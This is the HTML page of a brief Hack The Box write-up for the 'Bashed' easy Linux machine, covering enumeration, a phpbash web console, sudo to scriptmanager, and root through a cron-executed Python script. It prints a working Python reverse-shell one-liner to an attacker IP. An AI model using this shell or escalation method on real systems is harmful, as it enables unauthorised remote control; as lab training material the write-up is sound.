@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Bashed | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/bashed-easy-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/bashed-easy-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/bashed-easy-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Bashed">
+  <meta property="og:description" content="Easy Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bashed">
+  <meta name="twitter:description" content="Easy Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Bashed",
+      "item": "http://localhost:1313/htb/bashed-easy-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bashed",
+  "name": "Bashed",
+  "description": "Easy Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan shows port 80 open\ndo some enumeration, and fuzz - find that there is a directory “/dev” clicking phpbash seems to open up a console\nwe can effectively run as scriptmanager user using sudo -u scriptmanager\nThe bash reverse shells weren’t really working, but there is python3 on the box so we use a python3 reverse shell instead:\npython3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"10.10.16.196\",9000)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\"])' we are script manager and seeing the root directory, there is a directory called scripts\nWe find in /scripts a test.py file which is owned by scriptmanager and a test.txt file owned by root - the test.py file contains code which writes this test.txt file But running python3 test.py doesnt work because we dont have permission to write as test.txt is owned by root\nThis lead me to think there was a cron job or something somewhere Looking into it couldnt really find anything but I looked at test.txt and it had changed based on what I had put in the python code:\nSo lets try put reverse shell code in the file\nand we got it ",
+  "wordCount" : "187",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/bashed-easy-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Bashed
+    </h1>
+    <div class="post-description">
+      Easy Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan shows port 80 open</p>
+<p>do some enumeration, and fuzz - find that there is a directory &ldquo;/dev&rdquo;
+<img alt="Bashed (Easy Linux).png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29.png"></p>
+<p>clicking phpbash seems to open up a console</p>
+<p><img alt="Bashed (Easy Linux)-1.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-1.png">
+we can effectively run as scriptmanager user using <code>sudo -u scriptmanager</code></p>
+<p>The bash reverse shells weren&rsquo;t really working, but there is python3 on the box so we use a python3 reverse shell instead:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os; s=socket.socket(); s.connect((&#34;10.10.16.196&#34;,9000)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><p><img alt="Bashed (Easy Linux)-2.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-2.png"></p>
+<p>we are script manager and seeing the root directory, there is a directory called scripts</p>
+<p>We find in /scripts a test.py file which is owned by scriptmanager and a test.txt file owned by root - the test.py file contains code which writes this test.txt file
+But running <code>python3 test.py</code> doesnt work because we dont have permission to write as test.txt is owned by root</p>
+<p>This lead me to think there was a cron job or something somewhere
+Looking into it couldnt really find anything but I looked at test.txt and it had changed based on what I had put in the python code:</p>
+<p><img alt="Bashed (Easy Linux)-3.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-3.png"></p>
+<p>So lets try put reverse shell code in the file</p>
+<p>and we got it
+<img alt="Bashed (Easy Linux)-5.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-5.png"></p>
+<p><img alt="Bashed (Easy Linux)-4.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-4.png"></p>
+<p><img alt="Bashed (Easy Linux)-6.png" loading="lazy" src="/htb/bashed-easy-linux/Bashed%20%28Easy%20Linux%29-6.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
